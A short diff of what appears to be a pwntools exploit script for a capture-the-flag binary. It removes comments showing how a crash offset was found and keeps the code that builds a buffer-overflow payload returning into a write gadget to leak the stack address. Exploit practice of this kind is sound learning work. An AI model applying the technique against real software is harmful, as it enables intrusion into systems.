@@ -26,12 +26,6 @@ if len(sys.argv) > 2 and sys.argv[2] == 'test':
     sys.exit(0)
 ##########################################################
 
-# >>> cyclic(32)
-# aaaabaaacaaadaaaeaaafaaagaaahaaa
-# >>> # Program received signal SIGSEGV (fault address 0x61616166)
-# >>> cyclic_find(0x61616166)
-# 20
-
 with log.progress('Retrieving ESP') as l:
     payload = 'A' * 20
     payload += p32(0x08048087) # return to write so we leak buffer address
